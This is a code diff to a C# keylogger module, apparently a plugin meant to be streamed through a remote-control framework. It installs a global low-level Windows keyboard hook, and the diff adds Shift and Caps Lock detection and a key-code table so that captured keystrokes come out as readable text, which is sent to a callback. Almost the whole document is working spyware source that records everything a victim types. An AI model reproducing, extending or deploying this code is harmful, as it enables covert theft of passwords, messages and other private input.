@@ -1,12 +1,60 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Web;
 
 namespace KeyLogger
 {
     public class Program
     {
+
+        static Dictionary<int, string> special = new Dictionary<int, string>()
+        {
+            { 8, "<bs>" },
+            { 9, "  " },
+            { 13, "<et>" },
+            { 27, "<esc>" },
+            { 32, " " },
+            { 37, "<ra>" },
+            { 38, "<ua>" },
+            { 39, "<la>" },
+            { 40, "<da>" },
+            { 46, "<de>" },
+            { 48, ")" },
+            { 49, "!" },
+            { 50, "@" },
+            { 51, "#" },
+            { 52, "$" },
+            { 53, "%" },
+            { 54, "^" },
+            { 55, "&" },
+            { 56, "*" },
+            { 57, "(" },
+            { 186, ";" },
+            { 187, "=" },
+            { 188, "," },
+            { 189, "-" },
+            { 190, "." },
+            { 191, "/" },
+            { 192, "`" },
+            { 219, "[" },
+            { 220, "\\" },
+            { 221, "]" },
+            { 222, "'" },
+            { 286, "+" },
+            { 287, ":" },
+            { 288, "<" },
+            { 289, "_" },
+            { 290, ">" },
+            { 291, "?" },
+            { 292, "~" },
+            { 319, "{" },
+            { 320, "|" },
+            { 321, "}" },
+            { 322, "\"" },
+        };
 
         static bool _running = true;
         static Func<object, Task> callback = null;
@@ -16,6 +64,22 @@ namespace KeyLogger
             Console.WriteLine("Module needs to be streamed");
             return 0;
         }
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
+        public static extern short GetKeyState(int keyCode);
+
+        /*public static int Main(string[] args)
+        {
+
+            using (var input = new Input())
+            {
+                input.KeyPressed += Input_KeyPressed;
+                Pause();
+                input.KeyPressed -= Input_KeyPressed;
+            }
+
+            return 0;
+        }*/
 
         public static void Stream(Func<object, Task> cb)
         {
@@ -30,7 +94,47 @@ namespace KeyLogger
 
         private static void Input_KeyPressed(int vKey)
         {
-            callback(new { output = ((char)vKey).ToString(), returnType = 11 });
+            var isUpper = (((ushort)GetKeyState(0x14)) & 0xffff) != 0
+                || GetKeyState(0xA0) < 0
+                || GetKeyState(0xA1) < 0;
+
+            var r = string.Empty;
+            if (vKey >= 48 && vKey <= 57)
+            {
+                if (isUpper)
+                {
+                    r = special[vKey];
+                }
+                else
+                {
+                    r = ((char)vKey).ToString();
+                }
+            }
+            else if (vKey >= 65 && vKey <= 90)
+            {
+                if (!isUpper) vKey += 32;
+                r = ((char)vKey).ToString();
+            }
+            else if (vKey >= 186 && vKey <= 222)
+            {
+                if (isUpper) vKey += 100;
+                if (special.ContainsKey(vKey))
+                {
+                    r = special[vKey];
+                }
+            }
+            else
+            {
+                if (special.ContainsKey(vKey))
+                {
+                    r = special[vKey];
+                }
+            }
+
+            if (r != string.Empty)
+            {
+                callback(new { output = HttpUtility.HtmlEncode(r), returnType = 11 });
+            }
         }
 
         private static void Pause()
@@ -46,7 +150,7 @@ namespace KeyLogger
     {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
-        private const int WM_SYSKEYDOWN = 0x0104;
+
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -95,12 +199,10 @@ namespace KeyLogger
         {
             if (nCode < 0) return;
 
-            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+            if (wParam == WM_KEYDOWN)
             {
                 var vkCode = Marshal.ReadInt32(lParam);
-
                 OnKeyPressed?.Invoke(this, vkCode);
-                return;
             }
 
         }
@@ -123,17 +225,6 @@ namespace KeyLogger
 
         private bool _isRunning;
 
-        private struct POINT
-        {
-            public int X { get; }
-            public int Y { get; }
-            public POINT(int x, int y)
-            {
-                X = x;
-                Y = y;
-            }
-        }
-
 
         [StructLayout(LayoutKind.Sequential)]
         private struct MSG
@@ -143,7 +234,6 @@ namespace KeyLogger
             UIntPtr wParam;
             IntPtr lParam;
             int time;
-            POINT pt;
         }
 
         public void Start()
